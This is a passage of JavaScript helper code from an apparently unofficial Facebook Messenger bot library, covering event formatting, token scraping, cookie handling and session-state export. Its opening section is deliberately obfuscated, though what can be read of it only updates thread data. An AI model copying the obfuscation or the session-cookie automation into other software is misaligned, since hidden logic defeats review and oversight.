                            updateData(formatID((m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(0O334664274 - 0x37368B9)]] || m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(1011010 - 0O3666474)]])[QUbW[(15658734 ^ 0O73567354)]]()), MpUS)
                        }
                        break;
                        case QUbW[32]: {
                            let ImOS = getData(formatID((m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(0O334664274 - 0x37368B9)]] || m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(1011010 - 0O3666474)]])[QUbW[(15658734 ^ 0O73567354)]]()));
                            var koRS = beeS[beeS.QDDN(43)]();
                            while (koRS < beeS[beeS.Iv0N(44)]()) switch (koRS) {
                                case (0x75bcd15 - 0O726746425):
                                    koRS = ImOS[QUbW[31]] == !![] ? beeS[beeS.EqVN(45)]() : beeS[beeS.cTSN(46)]();
                                    break;
                                case (0O57060516 - 0xbc614d):
                                    koRS = beeS[beeS.Iv0N(44)](); {
                                        ImOS[QUbW[31]] = (NaN === NaN)
                                    }
                                    break;
                                case (15658734 ^ 0O73567354):
                                    koRS = beeS[beeS.Iv0N(44)](); {
                                        ImOS[QUbW[31]] = !![]
                                    }
                                    break;
                            }
                            updateData(formatID((m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(0O334664274 - 0x37368B9)]] || m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(1011010 - 0O3666474)]])[QUbW[(15658734 ^ 0O73567354)]]()), ImOS)
                        }
                        break;
                        case QUbW[34]: {
                            let kIET = getData(formatID((m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(0O334664274 - 0x37368B9)]] || m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(1011010 - 0O3666474)]])[QUbW[(15658734 ^ 0O73567354)]]()));
                            kIET[QUbW[33]] = (logMessageData[QUbW[18]] || formatID((m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(0O334664274 - 0x37368B9)]] || m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(1011010 - 0O3666474)]])[QUbW[(15658734 ^ 0O73567354)]]()));
                            updateData(formatID((m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(0O334664274 - 0x37368B9)]] || m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(1011010 - 0O3666474)]])[QUbW[(15658734 ^ 0O73567354)]]()), kIET)
                        }
                        break;
                        case QUbW[40]: {
                            let MJHT = getData(formatID((m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(0O334664274 - 0x37368B9)]] || m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(1011010 - 0O3666474)]])[QUbW[(15658734 ^ 0O73567354)]]()));
                            ghsgb: for (let gFyT of logMessageData[QUbW[35]]) {
                                var IGBT = beeS[beeS.QDDN(43)]();
                                while (IGBT < beeS[beeS.Iv0N(44)]()) switch (IGBT) {
                                    case (0x75bcd15 - 0O726746425):
                                        IGBT = MJHT[QUbW[21]][QUbW[37]](cCsT => {
                                            return cCsT[QUbW[19]] == gFyT[QUbW[36]]
                                        }) ? beeS[beeS.EqVN(45)]() : beeS[beeS.cTSN(46)]();
                                        break;
                                    case (0O57060516 - 0xbc614d):
                                        IGBT = beeS[beeS.Iv0N(44)](); {
                                            continue ghsgb
                                        }
                                        break;
                                    case (15658734 ^ 0O73567354):
                                        IGBT = beeS[beeS.Iv0N(44)](); {
                                            MJHT[QUbW[21]][QUbW[24]]({
                                                [beeS.QDDN(19)]: gFyT[QUbW[36]],
                                                [beeS.wgLN(18)]: gFyT[QUbW[38]],
                                                [beeS.UKfO(47)]: getGenderByPhysicalMethod(gFyT[QUbW[38]])
                                            });
                                            MJHT[QUbW[39]][QUbW[24]](gFyT[QUbW[36]])
                                        }
                                        break;
                                }
                            }
                            updateData(formatID((m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(0O334664274 - 0x37368B9)]] || m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(1011010 - 0O3666474)]])[QUbW[(15658734 ^ 0O73567354)]]()), MJHT)
                        }
                        break;
                        case QUbW[42]: {
                            let EDvT = getData(formatID((m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(0O334664274 - 0x37368B9)]] || m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(1011010 - 0O3666474)]])[QUbW[(15658734 ^ 0O73567354)]]()));
                            EDvT[QUbW[39]] = EDvT[QUbW[39]][QUbW[27]](YymT => {
                                return YymT != logMessageData[QUbW[41]]
                            });
                            EDvT[QUbW[21]] = EDvT[QUbW[21]][QUbW[27]](AApT => {
                                return AApT[QUbW[19]] != logMessageData[QUbW[41]]
                            });
                            var AUcU = beeS[beeS.QDDN(43)]();
                            while (AUcU < beeS[beeS.Iv0N(44)]()) switch (AUcU) {
                                case (0x75bcd15 - 0O726746425):
                                    AUcU = EDvT[QUbW[25]][QUbW[37]](cWfU => {
                                        return cWfU[QUbW[19]] == logMessageData[QUbW[41]]
                                    }) ? beeS[beeS.EqVN(45)]() : beeS[beeS.Iv0N(44)]();
                                    break;
                                case (0O57060516 - 0xbc614d):
                                    AUcU = beeS[beeS.Iv0N(44)](); {
                                        EDvT[QUbW[25]] = EDvT[QUbW[25]][QUbW[27]](wRWT => {
                                            return wRWT[QUbW[19]] != logMessageData[QUbW[41]]
                                        })
                                    }
                                    break;
                            }
                            updateData(formatID((m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(0O334664274 - 0x37368B9)]] || m[QUbW[(0O507646144 ^ 0x51F4C61)]][QUbW[(0x5E30A78 - 0O570605164)]][QUbW[(1011010 - 0O3666474)]])[QUbW[(15658734 ^ 0O73567354)]]()), EDvT)
                        }
                        break;
                    }
                }
            }
        }
    break;
}

return {
    type: "event",
    threadID: formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),
    logMessageType: logMessageType,
    logMessageData: logMessageData,
    logMessageBody: m.messageMetadata.adminText,
    author: m.messageMetadata.actorFbId,
    participantIDs: m.participants || []
    };  
}

/**
 * @param {{ st: any; from: { toString: () => any; }; to: any; thread_fbid: any; hasOwnProperty: (arg0: string) => any; from_mobile: any; realtime_viewer_fbid: any; }} event
 */

function formatTyp(event) {
return {
        isTyping: !!event.st,
        from: event.from.toString(),
        threadID: formatID((event.to || event.thread_fbid || event.from).toString()),
        // When receiving typ indication from mobile, `from_mobile` isn't set.
        // If it is, we just use that value.
        fromMobile: event.hasOwnProperty("from_mobile") ? event.from_mobile : true,
        userID: (event.realtime_viewer_fbid || event.from).toString(),
        type: "typ"
    };
}

/**
 * @param {{ st: any; from: { toString: () => any; }; to: any; thread_fbid: any; hasOwnProperty: (arg0: string) => any; from_mobile: any; realtime_viewer_fbid: any; }} event
 */

function formatTyp(event) {
    return {
        isTyping: !!event.st,
        from: event.from.toString(),
        threadID: formatID((event.to || event.thread_fbid || event.from).toString()),
        // When receiving typ indication from mobile, `from_mobile` isn't set.
        // If it is, we just use that value.
        fromMobile: event.hasOwnProperty("from_mobile") ? event.from_mobile : true,
        userID: (event.realtime_viewer_fbid || event.from).toString(),
        type: "typ"
    };
}

/**
 * @param {{ threadKey: { otherUserFbId: any; threadFbId: any; }; actorFbId: any; actionTimestampMs: any; }} delta
 */

function formatDeltaReadReceipt(delta) {
    // otherUserFbId seems to be used as both the readerID and the threadID in a 1-1 chat.
    // In a group chat actorFbId is used for the reader and threadFbId for the thread.
    return {
        reader: (delta.threadKey.otherUserFbId || delta.actorFbId).toString(),
        time: delta.actionTimestampMs,
        threadID: formatID((delta.threadKey.otherUserFbId || delta.threadKey.threadFbId).toString()),
        type: "read_receipt"
    };
}

/**
 * @param {{ reader: { toString: () => any; }; time: any; thread_fbid: any; }} event
 */

function formatReadReceipt(event) {
    return {
        reader: event.reader.toString(),
        time: event.time,
        threadID: formatID((event.thread_fbid || event.reader).toString()),
        type: "read_receipt"
    };
}

/**
 * @param {{ chat_ids: any[]; thread_fbids: any[]; timestamp: any; }} event
 */

function formatRead(event) {
    return {
        threadID: formatID(((event.chat_ids && event.chat_ids[0]) || (event.thread_fbids && event.thread_fbids[0])).toString()),
        time: event.timestamp,
        type: "read"
    };
}

/**
 * @param {string} str
 * @param {string | any[]} startToken
 * @param {string} endToken
 */

function getFrom(str, startToken, endToken) {
    var start = str.indexOf(startToken) + startToken.length;
    if (start < startToken.length) return "";

    var lastHalf = str.substring(start);
    var end = lastHalf.indexOf(endToken);
    if (end === -1) throw Error("Could not find endTime `" + endToken + "` in the given string.");
    return lastHalf.substring(0, end);
}

/**
 * @param {string} html
 */

function makeParsable(html) {
    let withoutForLoop = html.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/
, "");

    // (What the fuck FB, why windows style newlines?)
    // So sometimes FB will send us base multiple objects in the same response.
    // They're all valid JSON, one after the other, at the top level. We detect
    // that and make it parse-able by JSON.parse.
    //       Ben - July 15th 2017
    //
    // It turns out that Facebook may insert random number of spaces before
    // next object begins (issue #616)
    //       rav_kr - 2018-03-19
    let maybeMultipleObjects = withoutForLoop.split(/\}\r\n *\{/);
    if (maybeMultipleObjects.length === 1) return maybeMultipleObjects;

    return "[" + maybeMultipleObjects.join("},{") + "]";
}

/**
 * @param {any} form
 */

function arrToForm(form) {
    return arrayToObject(form,
        function(/** @type {{ name: any; }} */v) {
            return v.name;
        },
        function(/** @type {{ val: any; }} */v) {
            return v.val;
        }
    );
}

/**
 * @param {any[]} arr
 * @param {{ (v: any): any; (arg0: any): string | number; }} getKey
 * @param {{ (v: any): any; (arg0: any): any; }} getValue
 */

function arrayToObject(arr, getKey, getValue) {
    return arr.reduce(function(/** @type {{ [x: string]: any; }} */
 acc, /** @type {any} */val) {
        acc[getKey(val)] = getValue(val);
        return acc;
    }, {});
}

function getSignatureID() {
    return Math.floor(Math.random() * 2147483648).toString(16);
}

function generateTimestampRelative() {
    var d = new Date();
    return d.getHours() + ":" + padZeros(d.getMinutes());
}

/**
 * @param {any} html
 * @param {any} userID
 * @param {{ fb_dtsg: any; ttstamp: any; globalOptions: any; }} ctx
 */

function makeDefaults(html, userID, ctx) {
    var reqCounter = 1;
    var fb_dtsg = getFrom(html, 'name="fb_dtsg" value="', '"');

    // @Hack Ok we've done hacky things, this is definitely on top 5.
    // We totally assume the object is flat and try parsing until a }.
    // If it works though it's cool because we get a bunch of extra data things.
    //
    // Update: we don't need this. Leaving it in in case we ever do.
    //       Ben - July 15th 2017

    // var siteData = getFrom(html, "[\"SiteData\",[],", "},");
    // try {
    //   siteData = JSON.parse(siteData + "}");
    // } catch(e) {
    //   log.warn("makeDefaults", "Couldn't parse SiteData. Won't have access to some variables.");
    //   siteData = {};
    // }

    var ttstamp = "2";
    for (var i = 0; i < fb_dtsg.length; i++) ttstamp += fb_dtsg.charCodeAt(i);
    var revision = getFrom(html, 'revision":', ",");

    /**
     * @param {{ [x: string]: any; hasOwnProperty: (arg0: string) => any; }} obj
     */

    function mergeWithDefaults(obj) {
        // @TODO This is missing a key called __dyn.
        // After some investigation it seems like __dyn is some sort of set that FB
        // calls BitMap. It seems like certain responses have a "define" key in the
        // res.jsmods arrays. I think the code iterates over those and calls `set`
        // on the bitmap for each of those keys. Then it calls
        // bitmap.toCompressedString() which returns what __dyn is.
        //
        // So far the API has been working without this.
        //
        //              Ben - July 15th 2017
        var newObj = {
            __user: userID,
            __req: (reqCounter++).toString(36),
            __rev: revision,
            __a: 1,
            // __af: siteData.features,
            fb_dtsg: ctx.fb_dtsg ? ctx.fb_dtsg : fb_dtsg,
            jazoest: ctx.ttstamp ? ctx.ttstamp : ttstamp
                // __spin_r: siteData.__spin_r,
                // __spin_b: siteData.__spin_b,
                // __spin_t: siteData.__spin_t,
        };

        // @TODO this is probably not needed.
        //         Ben - July 15th 2017
        // if (siteData.be_key) {
        //   newObj[siteData.be_key] = siteData.be_mode;
        // }
        // if (siteData.pkg_cohort_key) {
        //   newObj[siteData.pkg_cohort_key] = siteData.pkg_cohort;
        // }

        if (!obj) return newObj;
        for (var prop in obj)
            if (obj.hasOwnProperty(prop))
                if (!newObj[prop]) newObj[prop] = obj[prop];
        return newObj;
    }

    /**
     * @param {any} url
     * @param {any} jar
     * @param {any} form
     * @param {any} ctxx
     */

    function postWithDefaults(url, jar, form, ctxx) {
        return post(url, jar, mergeWithDefaults(form), ctx.globalOptions, ctxx || ctx);
    }

    /**
     * @param {any} url
     * @param {any} jar
     * @param {any} qs
     * @param {any} ctxx
     */

    function getWithDefaults(url, jar, qs, ctxx) {
        return get(url, jar, mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);
    }

    /**
     * @param {any} url
     * @param {any} jar
     * @param {any} form
     * @param {any} qs
     * @param {any} ctxx
     */

    function postFormDataWithDefault(url, jar, form, qs, ctxx) {
        return postFormData(url, jar, mergeWithDefaults(form), mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);
    }

    return {
        get: getWithDefaults,
        post: postWithDefaults,
        postFormData: postFormDataWithDefault
    };
}

/**
 * @param {{ jar: { setCookie: (arg0: string, arg1: string) => void; }; fb_dtsg: string; ttstamp: string; }} ctx
 * @param {{ postFormData: (arg0: string, arg1: any, arg2: any, arg3: {}) => any; post: (arg0: string, arg1: any, arg2: any) => any; get: (arg0: any, arg1: any) => Promise<any>; }} defaultFuncs
 * @param {string | number} [retryCount]
 */

function parseAndCheckLogin(ctx, defaultFuncs, retryCount) {
    if (retryCount == undefined) retryCount = 0;
    return function(/** @type {{ body: string; statusCode: string | number; request: { uri: { protocol: string; hostname: string; pathname: string; }; headers: { [x: string]: string; }; formData: any; method: string; }; }} */data) {
        return bluebird.try(function() {
            log.verbose("parseAndCheckLogin", data.body);
            if (data.statusCode >= 500 && data.statusCode < 600) {
                if (retryCount >= 5) {
                    throw {
                        error: "Request retry failed. Check the `res` and `statusCode` property on this error.",
                        statusCode: data.statusCode,
                        res: data.body
                    };
                }
                retryCount++;
                var retryTime = Math.floor(Math.random() * 5000);
                log.warn("parseAndCheckLogin", "Got status code " + data.statusCode + " - " + retryCount + ". attempt to retry in " + retryTime + " milliseconds...");
                var url = data.request.uri.protocol + "//" + data.request.uri.hostname + data.request.uri.pathname;
                if (data.request.headers["Content-Type"].split(";")[0] === "multipart/form-data") {
                    return bluebird.delay(retryTime).then(() => defaultFuncs.postFormData(url, ctx.jar, data.request.formData, {}))
                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
                } else {
                    return bluebird.delay(retryTime).then(() => defaultFuncs.post(url, ctx.jar, data.request.formData))
                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
                }
            }
            if (data.statusCode !== 200) throw new Error("parseAndCheckLogin got status code: " + data.statusCode + ". Bailing out of trying to parse response.");

            var res = null;
            try {
                res = JSON.parse(makeParsable(data.body));
            } catch (e) {
                throw {
                    error: "JSON.parse error. Check the `detail` property on this error.",
                    detail: e,
                    res: data.body
                };
            }

            // In some cases the response contains only a redirect URL which should be followed
            if (res.redirect && data.request.method === "GET") return defaultFuncs.get(res.redirect, ctx.jar).then(parseAndCheckLogin(ctx, defaultFuncs));

            // TODO: handle multiple cookies?
            if (res.jsmods && res.jsmods.require && Array.isArray(res.jsmods.require[0]) && res.jsmods.require[0][0] === "Cookie") {
                res.jsmods.require[0][3][0] = res.jsmods.require[0][3][0].replace("_js_", "");
                var cookie = formatCookie(res.jsmods.require[0][3], "facebook");
                var cookie2 = formatCookie(res.jsmods.require[0][3], "messenger");
                ctx.jar.setCookie(cookie, "https://www.facebook.com");
                ctx.jar.setCookie(cookie2, "https://www.messenger.com");
            }

            // On every request we check if we got a DTSG and we mutate the context so that we use the latest
            // one for the next requests.
            if (res.jsmods && Array.isArray(res.jsmods.require)) {
                var arr = res.jsmods.require;
                for (var i in arr) {
                    if (arr[i][0] === "DTSG" && arr[i][1] === "setToken") {
                        ctx.fb_dtsg = arr[i][3][0];

                        // Update ttstamp since that depends on fb_dtsg
                        ctx.ttstamp = "2";
                        for (var j = 0; j < ctx.fb_dtsg.length; j++) ctx.ttstamp += ctx.fb_dtsg.charCodeAt(j);
                    }
                }
            }

            if (res.error === 1357001) {
                switch (globalThis.Fca.Require.FastConfig.AutoLogin) {
                    case true: {
                        globalThis.Fca.Require.logger.Warning(globalThis.Fca.Require.Language.Index.AutoLogin, function() {
                            return globalThis.Fca.AutoLogin();
                        });
                        break;
                    }
                    case false: {
                        throw { error: globalThis.Fca.Require.Language.Index.ErrAppState };
                        
                    }
                }
            }
            else return res;
        });
    };
}

/**
 * @param {{ setCookie: (arg0: any, arg1: string) => void; }} jar
 */

function saveCookies(jar) {
    return function(/** @type {{ headers: { [x: string]: any[]; }; }} */res) {
        var cookies = res.headers["set-cookie"] || [];
        cookies.forEach(function(/** @type {string} */c) {
            if (c.indexOf(".facebook.com") > -1) { // yo wtf is this?
                jar.setCookie(c, "https://www.facebook.com");
                jar.setCookie(c.replace(/domain=\.facebook\.com/, "domain=.messenger.com"), "https://www.messenger.com");
            }
        });
        return res;
    };
}

var NUM_TO_MONTH = [
    "Jan",
    "Feb",
    "Mar",
    "Apr",
    "May",
    "Jun",
    "Jul",
    "Aug",
    "Sep",
    "Oct",
    "Nov",
    "Dec"
];
var NUM_TO_DAY = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];

/**
 * @param {{ getUTCDate: () => any; getUTCHours: () => any; getUTCMinutes: () => any; getUTCSeconds: () => any; getUTCDay: () => string | number; getUTCMonth: () => string | number; getUTCFullYear: () => string; }} date
 */

function formatDate(date) {
    var d = date.getUTCDate();
    d = d >= 10 ? d : "0" + d;
    var h = date.getUTCHours();
    h = h >= 10 ? h : "0" + h;
    var m = date.getUTCMinutes();
    m = m >= 10 ? m : "0" + m;
    var s = date.getUTCSeconds();
    s = s >= 10 ? s : "0" + s;
    return (NUM_TO_DAY[date.getUTCDay()] + ", " + d + " " + NUM_TO_MONTH[date.getUTCMonth()] + " " + date.getUTCFullYear() + " " + h + ":" + m + ":" + s + " GMT");
}

/**
 * @param {string[]} arr
 * @param {string} url
 */

function formatCookie(arr, url) {
    return arr[0] + "=" + arr[1] + "; Path=" + arr[3] + "; Domain=" + url + ".com";
}

/**
 * @param {{ thread_fbid: { toString: () => any; }; participants: any[]; name: any; custom_nickname: any; snippet: any; snippet_attachments: any; snippet_sender: any; unread_count: any; message_count: any; image_src: any; timestamp: any; mute_until: any; is_canonical_user: any; is_canonical: any; is_subscribed: any; folder: any; is_archived: any; recipients_loadable: any; has_email_participant: any; read_only: any; can_reply: any; cannot_reply_reason: any; last_message_timestamp: any; last_read_timestamp: any; last_message_type: any; custom_like_icon: any; custom_color: any; admin_ids: any; thread_type: any; }} data
 */

function formatThread(data) {
    return {
        threadID: formatID(data.thread_fbid.toString()),
        participants: data.participants.map(formatID),
        participantIDs: data.participants.map(formatID),
        name: data.name,
        nicknames: data.custom_nickname,
        snippet: data.snippet,
        snippetAttachments: data.snippet_attachments,
        snippetSender: formatID((data.snippet_sender || "").toString()),
        unreadCount: data.unread_count,
        messageCount: data.message_count,
        imageSrc: data.image_src,
        timestamp: data.timestamp,
        muteUntil: data.mute_until,
        isCanonicalUser: data.is_canonical_user,
        isCanonical: data.is_canonical,
        isSubscribed: data.is_subscribed,
        folder: data.folder,
        isArchived: data.is_archived,
        recipientsLoadable: data.recipients_loadable,
        hasEmailParticipant: data.has_email_participant,
        readOnly: data.read_only,
        canReply: data.can_reply,
        cannotReplyReason: data.cannot_reply_reason,
        lastMessageTimestamp: data.last_message_timestamp,
        lastReadTimestamp: data.last_read_timestamp,
        lastMessageType: data.last_message_type,
        emoji: data.custom_like_icon,
        color: data.custom_color,
        adminIDs: data.admin_ids,
        threadType: data.thread_type
    };
}

/**
 * @param {any} obj
 */

function getType(obj) {
    return Object.prototype.toString.call(obj).slice(8, -1);
}

/**
 * @param {{ lat: number; p: any; }} presence
 * @param {any} userID
 */

function formatProxyPresence(presence, userID) {
    if (presence.lat === undefined || presence.p === undefined) return null;
    return {
        type: "presence",
        timestamp: presence.lat * 1000,
        userID: userID || '',
        statuses: presence.p
    };
}

/**
 * @param {{ la: number; a: any; }} presence
 * @param {any} userID
 */

function formatPresence(presence, userID) {
    return {
        type: "presence",
        timestamp: presence.la * 1000,
        userID: userID || '',
        statuses: presence.a
    };
}

/**
 * @param {any} payload
 */

function decodeClientPayload(payload) {
    /*
    Special function which Client using to "encode" clients JSON payload
    */

    /**
     * @param {string | any[]} array
     */

    function Utf8ArrayToStr(array) {
        var out, i, len, c;
        var char2, char3;
        out = "";
        len = array.length;
        i = 0;
        while (i < len) {
            c = array[i++];
            switch (c >> 4) {
                case 0:
                case 1:
                case 2:
                case 3:
                case 4:
                case 5:
                case 6:
                case 7:
                    out += String.fromCharCode(c);
                    break;
                case 12:
                case 13:
                    char2 = array[i++];
                    out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
                    break;
                case 14:
                    char2 = array[i++]; 
                    char3 = array[i++];
                    out += String.fromCharCode(((c & 0x0F) << 12) | ((char2 & 0x3F) << 6) | ((char3 & 0x3F) << 0));
                    break;
            }
        }
        return out;
    }
    return JSON.parse(Utf8ArrayToStr(payload));
}

/**
 * @param {{ getCookies: (arg0: string) => string | any[]; }} jar
 */

function getAppState(jar, Encode) {
    var prettyMilliseconds = require('pretty-ms')
    var getText = globalThis.Fca.getText;
    var Security = require('./Extra/Security/Index');
    var appstate = jar.getCookies("https://www.facebook.com").concat(jar.getCookies("https://facebook.com")).concat(jar.getCookies("https://www.messenger.com"))
    var logger = require('./logger'),languageFile = require('./Language/index.json');
    var Language = languageFile.find(i => i.Language == globalThis.Fca.Require.FastConfig.Language).Folder.Index;
    var data;
        switch (require("../../FastConfigFca.json").EncryptFeature) {
            case true: {
                if (Encode == undefined) Encode = true;
                if (process.env['FBKEY'] != undefined && Encode) {
                    if(!globalThis.Fca.Setting.get('getAppState')) {
                        logger.Normal(Language.EncryptSuccess);
                        data = Security(JSON.stringify(appstate),process.env['FBKEY'],"Encrypt");
                        globalThis.Fca.Setting.set('AppState', data);
                    }
                    else {
                        data = globalThis.Fca.Setting.get('AppState');
                    }
                }
                else return appstate;
            }
                break;
            case false: {
                data = appstate;
            }
                break;
            default: {
                logger.Normal(getText(Language.IsNotABoolean,require("../../FastConfigFca.json").EncryptFeature));
                data = appstate;
            } 
        }
            if(!globalThis.Fca.Setting.get('getAppState')) {
                logger.Normal(getText(Language.ProcessDone,`${prettyMilliseconds(Date.now() - globalThis.Fca.startTime)}`),function() { globalThis.Fca.Setting.set('getAppState',true) });
            }
    return data;
}

module.exports = {
    isReadableStream:isReadableStream,
    get:get,
    post:post,
    postFormData:postFormData,
    generateThreadingID:generateThreadingID,
    generateOfflineThreadingID:generateOfflineThreadingID,
    getGUID:getGUID,
    getFrom:getFrom,
    makeParsable:makeParsable,
    arrToForm:arrToForm,
    getSignatureID:getSignatureID,
    getJar: request.jar,
    generateTimestampRelative:generateTimestampRelative,
    makeDefaults:makeDefaults,
    parseAndCheckLogin:parseAndCheckLogin,
    getGender: getGenderByPhysicalMethod,
    saveCookies,
    getType,
    _formatAttachment,
    formatHistoryMessage,
    formatID,
    formatMessage,
    formatDeltaEvent,
    formatDeltaMessage,
    formatProxyPresence,
    formatPresence,
    formatTyp,
    formatDeltaReadReceipt,
    formatCookie,
    formatThread,
    formatReadReceipt,
    formatRead,
    generatePresence,
    generateAccessiblityCookie,
    formatDate,
    decodeClientPayload,
    getAppState,
    getAdminTextMessageType,
    setProxy
};